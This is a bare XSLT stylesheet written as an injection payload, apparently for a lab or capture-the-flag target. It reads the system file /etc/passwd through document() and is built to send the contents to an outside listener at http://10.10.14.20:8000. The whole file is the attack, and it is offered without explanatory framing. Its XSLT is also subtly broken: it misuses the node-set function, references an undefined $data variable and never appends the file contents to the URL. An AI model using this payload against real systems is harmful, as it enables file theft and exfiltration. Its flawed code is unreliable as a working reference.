<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:exslt="http://exslt.org/common" extension-element-prefixes="exslt">
  
  <xsl:output method="text"/>
  
  <xsl:variable name="file-to-read">file:///etc/passwd</xsl:variable>

  <xsl:template match="/">
    <exslt:node-set name="data">
      <url>http://10.10.14.20:8000/?c=</url>
      <file-data><xsl:value-of select="document($file-to-read)"/></file-data>
    </exslt:node-set>
    
    <xsl:value-of select="document(exslt:node-set($data)/url)"/>
    
  </xsl:template>
</xsl:stylesheet>
